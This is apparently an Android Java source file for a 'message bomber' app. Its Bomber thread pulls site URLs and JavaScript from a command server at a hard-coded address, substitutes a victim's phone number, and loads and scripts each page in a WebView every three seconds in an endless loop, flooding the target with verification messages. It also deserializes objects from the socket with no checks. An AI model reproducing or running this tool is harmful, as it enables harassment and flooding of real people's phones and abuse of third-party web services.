package com.example.service;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.OptionalDataException;
import java.io.StreamCorruptedException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;

import org.json.JSONArray;

import com.example.data.DataObject;
import com.example.messagebomber.R.string;

import android.content.Context;
import android.text.StaticLayout;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class Bomber extends Thread {

	int i = 0;
	int j = 0;
	String phoneNumber;
	WebView webView;
	String string;
	int flag = 0;
	int flag2 = 0;
	DataObject dao = null;
	ObjectInputStream ois = null;
	boolean finish = true;

	public Bomber(String phoneNumber, WebView webView) {
		this.phoneNumber = phoneNumber;
		this.webView = webView;

	}

	public void run() {
		Socket socket = null;
		try {
			socket = new Socket("192.168.1.110", 9999);
	
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		while (true) {
			try {
				ois = new ObjectInputStream(new BufferedInputStream(
						socket.getInputStream()));			
				dao = (DataObject) ois.readObject();
			} catch (OptionalDataException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			} catch (ClassNotFoundException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			System.out.println(dao.getUrl());
			System.out.println(dao.getJs());
			dao.setUrl(replaceString(dao.getUrl(), "13538805451", phoneNumber));
			dao.setJs(replaceString(dao.getJs(), "13538805451", phoneNumber));
			System.out.println(dao.getUrl());
			System.out.println(dao.getJs());
			bomb(webView, dao.getUrl());
			try {
				sleep(3000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public void bomb(WebView webView, String url) {
		webView.getSettings().setJavaScriptEnabled(true);
		webView.setWebViewClient(new WebViewClient() {
			public void onPageFinished(WebView webView, String url) {
				super.onPageFinished(webView, url);
				webView.loadUrl(dao.getJs());
				System.out.println("js跑了");
			}
		});

		webView.loadUrl(url);
	}

	public static String replaceString(String src, String before, String after) {
		StringBuffer sb = new StringBuffer();
		int oldidx = 0;
		int idx = src.indexOf(before);
		while (idx != -1) {
			sb.append(src.substring(oldidx, idx)).append(after);
			oldidx = idx + before.length();
			idx = src.indexOf(before, oldidx);
		}
		if (oldidx < src.length())
			sb.append(src.substring(oldidx));
		return sb.toString();
	}

}
